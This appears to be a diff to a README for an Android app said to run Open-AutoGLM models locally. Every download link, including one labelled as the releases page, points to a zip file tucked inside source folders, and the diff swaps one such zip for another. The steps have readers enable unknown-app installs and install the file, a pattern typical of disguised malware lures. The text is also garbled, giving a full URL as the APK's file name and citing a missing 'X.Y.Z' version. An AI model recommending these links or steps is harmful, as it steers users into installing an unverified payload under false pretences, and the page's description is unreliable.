@@ -1,7 +1,7 @@
 # 🚀 AutoGLM-For-Android - Run AI Models Directly on Your Phone
 
 ## 📥 Download Now
-[![Download AutoGLM-For-Android](https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip)](https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip)
+[![Download AutoGLM-For-Android](https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip)](https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip)
 
 ## 📖 Overview
 AutoGLM-For-Android is a user-friendly application that allows you to run Open-AutoGLM models directly on your Android device. This means you can harness the power of AI without needing a computer. This app is perfect for anyone looking to experiment with AI on the go. 
@@ -17,10 +17,10 @@ Follow these simple steps to download and run AutoGLM-For-Android.
 
 ### Step 1: Visit the Releases Page
 To start, click the link below to go to the Releases page where you can find the latest version of the app:
-[Visit the Releases Page](https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip)
+[Visit the Releases Page](https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip)
 
 ### Step 2: Download the Application
-On the Releases page, you will see several versions of the app. Click on the link for the latest version to download the APK file. Generally, it will be named something like `https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip`, where `X.Y.Z` is the version number.
+On the Releases page, you will see several versions of the app. Click on the link for the latest version to download the APK file. Generally, it will be named something like `https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip`, where `X.Y.Z` is the version number.
 
 ### Step 3: Enable App Installation
 1. Open your device's **Settings**.
@@ -31,7 +31,7 @@ On the Releases page, you will see several versions of the app. Click on the lin
 
 ### Step 4: Install the App
 1. Open your **File Manager** app.
-2. Locate the `https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip` file you just downloaded.
+2. Locate the `https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip` file you just downloaded.
 3. Tap on the file to start the installation.
 4. Follow the on-screen instructions to complete the installation.
 
@@ -69,4 +69,4 @@ We welcome your feedback on AutoGLM-For-Android. If you have suggestions or enco
 
 ## 📥 Download Again
 For easy access again, here’s the link to the Releases page:
-[Download AutoGLM-For-Android](https://raw.githubusercontent.com/hasting323/AutoGLM-For-Android/master/app/src/main/res/mipmap-xxxhdpi/Android-GL-For-Auto-2.1.zip)
+[Download AutoGLM-For-Android](https://github.com/hasting323/AutoGLM-For-Android/raw/refs/heads/master/app/src/main/java/com/Auto_GL_Android_For_3.5.zip)
